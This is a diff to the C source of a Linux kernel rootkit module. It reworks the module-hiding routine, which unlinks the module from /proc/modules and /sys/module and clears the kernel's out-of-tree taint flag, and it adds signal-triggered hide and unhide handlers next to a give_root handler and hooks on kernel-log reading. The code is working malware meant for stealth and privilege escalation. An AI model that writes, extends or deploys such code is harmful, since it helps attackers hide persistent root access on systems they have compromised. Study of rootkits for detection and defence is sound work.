@@ -31,6 +31,9 @@ const string_t S_HIDDEN_PREFIXES[] = STRING_ARRAY(HIDDEN_PREFIXES);
 
 static bool b_hidden = false; // Is the rootkit hidden?
 
+static struct list_head *p_prev_module = NULL; // Pointer to the previous module in the list
+// static struct list_head *p_prev_module = NULL; // Pointer to the previous module in the list
+
 static task_t *(*_find_get_task_by_vpid)(pid_t nr) = NULL; // Pointer to `find_get_task_by_vpid()`
 
 static struct list_head *p_vma_list = NULL; // Pointer to `vmap_area_list`
@@ -107,7 +110,8 @@ bool is_filename_hidden(const char *const s_filename)
 
 void hide_module(void)
 {
-    unsigned int i = 0;
+    unsigned int i           = 0;
+    bool b_previously_hidden = false; // Was the module already hidden once?
     struct vmap_area *p_vma;
     struct vmap_area *p_vma_tmp;
     struct module_use *p_use;
@@ -120,6 +124,20 @@ void hide_module(void)
     IF_U (b_hidden) {
         pr_dev_warn("* Rootkit is already hidden\n");
         return;
+    }
+
+    if (p_prev_module != NULL) {
+        // p_prev_module can only be not NULL if the module was already hidden once
+        b_previously_hidden = true;
+    }
+
+    // Remove module from /proc/modules, saving a pointer to the previous module
+    p_prev_module = THIS_MODULE->list.prev;
+    list_del(&THIS_MODULE->list);
+
+    IF_U (b_previously_hidden) {
+        pr_dev_info("* Module was already hidden once, do not hide anything else\n");
+        goto end;
     }
 
     IF_L (p_tainted_mask == NULL) {
@@ -135,32 +153,6 @@ void hide_module(void)
 
             pr_dev_info("  * Cleared TAINT_OOT_MODULE status\n");
             pr_dev_info("  * Edited tainted_mask: *%p = %lu\n", p_tainted_mask, *p_tainted_mask);
-        }
-    }
-
-    IF_L (p_vma_list == NULL) {
-        p_vma_list = (struct list_head *)lookup_name("vmap_area_list");
-    }
-    pr_dev_info("* p_vma_list: %p\n", p_vma_list);
-
-    IF_L (p_vma_root == NULL) {
-        p_vma_root = (struct rb_root *)lookup_name("vmap_area_root");
-    }
-    pr_dev_info("* p_vma_root: %p\n", p_vma_root);
-
-    IF_U (p_vma_list == NULL || p_vma_root == NULL) {
-        pr_dev_err("* Failed to get `vmap_area_list` or `vmap_area_root` address\n");
-    }
-    else {
-        // Remove module from /proc/vmallocinfo
-        list_for_each_entry_safe (p_vma, p_vma_tmp, p_vma_list, list) {
-            if ((unsigned long)THIS_MODULE > p_vma->va_start &&
-                (unsigned long)THIS_MODULE < p_vma->va_end) {
-                pr_dev_info("* Removing VMAP area %p...", p_vma);
-                list_del(&p_vma->list);
-                rb_erase(&p_vma->rb_node, p_vma_root);
-                pr_dev_cont(" done\n");
-            }
         }
     }
 
@@ -211,9 +203,6 @@ void hide_module(void)
     kfree(THIS_MODULE->mkobj.drivers_dir);
     THIS_MODULE->mkobj.drivers_dir = NULL;
 
-    // Remove module from /proc/modules
-    list_del(&THIS_MODULE->list);
-
     // Remove module from /sys/module/
     kobject_del(&THIS_MODULE->mkobj.kobj);
     list_del(&THIS_MODULE->mkobj.kobj.entry);
@@ -253,9 +242,71 @@ void hide_module(void)
         }
     }
 
+    // Cannot hide module from /proc/vmallocinfo as it crashes when the module is removed
+    // TODO: save the module's vmap_areas, and restore them before removing the module
+    goto end; // For now, just skip this part
+
+    IF_L (p_vma_list == NULL) {
+        p_vma_list = (struct list_head *)lookup_name("vmap_area_list");
+        pr_dev_info("* p_vma_list: %p\n", p_vma_list);
+    }
+
+    IF_L (p_vma_root == NULL) {
+        p_vma_root = (struct rb_root *)lookup_name("vmap_area_root");
+        pr_dev_info("* p_vma_root: %p\n", p_vma_root);
+    }
+
+    IF_U (p_vma_list == NULL || p_vma_root == NULL) {
+        pr_dev_err("* Failed to get `vmap_area_list` or `vmap_area_root` address\n");
+    }
+    else {
+        // Remove module from /proc/vmallocinfo
+        list_for_each_entry_safe (p_vma, p_vma_tmp, p_vma_list, list) {
+            if ((unsigned long)THIS_MODULE > p_vma->va_start &&
+                (unsigned long)THIS_MODULE < p_vma->va_end) {
+                pr_dev_info("* Removing VMAP area %p...", p_vma);
+                list_del(&p_vma->list);
+                rb_erase(&p_vma->rb_node, p_vma_root);
+                pr_dev_cont(" done\n");
+            }
+        }
+    }
+
+end:
     b_hidden = true;
 
-    pr_dev_info("Module was hidden\n");
+    pr_dev_info("* Module was hidden\n");
+}
+
+void unhide_module(void)
+{
+    pr_dev_info("Unhiding module...\n");
+
+    IF_U (!b_hidden) {
+        pr_dev_warn("* Rootkit is not hidden\n");
+        return;
+    }
+
+    // Unhide module from /proc/modules
+    list_add(&THIS_MODULE->list, p_prev_module);
+
+    b_hidden = false;
+
+    pr_dev_info("* Module was unhidden\n");
+}
+
+long sig_hide_module(const pid_t i32_pid, const int i32_sig)
+{
+    hide_module();
+
+    return 0;
+}
+
+long sig_show_module(const pid_t i32_pid, const int i32_sig)
+{
+    unhide_module();
+
+    return 0;
 }
 
 long give_root(const pid_t i32_pid, const int i32_sig)
@@ -560,21 +611,19 @@ void restore_kmsg_read(void)
 
     IF_U (p_kmsg_proc_ops == NULL) {
         pr_dev_err("* `kmsg_proc_ops` is NULL\n");
-        return;
+        goto devkmsg;
     }
 
     IF_U (p_orig_kmsg_read == NULL) {
         pr_dev_err("* `p_orig_kmsg_read` is NULL\n");
-        return;
+        goto devkmsg;
     }
 
-    p_kmsg_proc_ops->proc_read = p_orig_kmsg_read;
+    change_protected_value(&p_kmsg_proc_ops->proc_read, p_orig_kmsg_read);
 
     pr_dev_info("* `kmsg_read()` restored\n");
-}
 
-void restore_devkmsg_read(void)
-{
+devkmsg:
     pr_dev_info("Restoring `devkmsg_read()`...\n");
 
     IF_U (p_kmsg_fops == NULL) {
@@ -587,7 +636,7 @@ void restore_devkmsg_read(void)
         return;
     }
 
-    p_kmsg_fops->read = p_orig_devkmsg_read;
+    change_protected_value(&p_kmsg_fops->read, p_orig_devkmsg_read);
 
     pr_dev_info("* `devkmsg_read()` restored\n");
 }
